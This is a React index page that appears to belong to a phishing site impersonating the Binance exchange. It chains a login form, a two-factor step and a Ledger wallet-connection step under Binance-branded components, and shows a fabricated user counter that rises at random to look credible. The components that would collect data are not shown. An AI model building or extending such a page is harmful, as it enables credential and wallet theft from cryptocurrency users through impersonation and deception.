
import React, { useState, useEffect } from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import WalletLedgerConnection from "@/components/WalletLedgerConnection";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";
import LoginForm from "@/components/LoginForm";
import TwoFactorAuth from "@/components/TwoFactorAuth";

type AuthStep = 'login' | 'twoFactor' | 'walletConnection';

const Index = () => {
  const [userCount, setUserCount] = useState(274368184);
  const [currentStep, setCurrentStep] = useState<AuthStep>('login');
  const [username, setUsername] = useState('');

  useEffect(() => {
    // Simulate counter increasing every few seconds
    const counterInterval = setInterval(() => {
      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 2000);
    
    return () => {
      clearInterval(counterInterval);
    };
  }, []);

  const handleLoginSuccess = (user: string) => {
    setUsername(user);
    setCurrentStep('twoFactor');
  };

  const handleTwoFactorSuccess = () => {
    setCurrentStep('walletConnection');
  };

  const handleBackToLogin = () => {
    setCurrentStep('login');
    setUsername('');
  };

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'login':
        return <LoginForm onLoginSuccess={handleLoginSuccess} />;
      case 'twoFactor':
        return (
          <TwoFactorAuth
            username={username}
            onTwoFactorSuccess={handleTwoFactorSuccess}
            onBack={handleBackToLogin}
          />
        );
      case 'walletConnection':
        return <WalletLedgerConnection />;
      default:
        return <LoginForm onLoginSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6">
          {renderCurrentStep()}
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
